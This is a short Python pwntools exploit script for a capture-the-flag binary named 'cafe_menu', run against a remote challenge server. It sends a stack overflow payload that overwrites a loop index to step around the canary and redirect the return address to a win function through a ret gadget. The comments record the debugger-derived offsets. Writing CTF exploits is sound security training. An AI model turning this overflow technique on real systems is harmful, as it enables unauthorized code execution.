#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./cafe_menu', checksec=False)
#context.terminal = ['ghostty', '-e', 'sh', '-c']
#p = process(elf.path)
p = remote('offsec.m0lecon.it', 13530)
# Your exploit here

# we need to bypass the canary, using a loop index overwrite. in particular, the index address is inside the rdx register, in position RBP - 16, above the canary
# using p $rbp, we find 0x7fffffffdbb0. so, RIP is at position RBP + 8 = 0x7fffffffdbb8
# using gdb, and running one iteration at a time, i can see that data.menu start at address 0x7fffffffdb70. while c is at address 0x7fffffffdb68
# buf, rbp distance: 0x7fffffffdbb0 - 0x7fffffffdb70 = 0x40 64 bytes
# buf, RIP distance: 0x7fffffffdbb8 - 0x7fffffffdb70 = 0x48 72 bytes
# idx is at position buf + 48.

win_addr = 0x401262
ret_gadget = 0x40101a

BUF_SIZE = 48
rip_offset = 0x47 # 71 bytes from the start of the buffer to the RIP. 72 breaks everything

p.recvuntil(b'):')


payload = b"A" * 48
payload += p8(rip_offset) # we want to jump at the RIP position. 
payload += p64(ret_gadget)
payload += p64(win_addr)
payload += p8(0xff) # to exit the loop

#gdb.attach(p, '''
# Break alla fine di vuln, prima del ritorno
#break *vuln+140
#continue
#''')
#pause()

p.send(payload)
#print(p.recvline())

p.interactive()
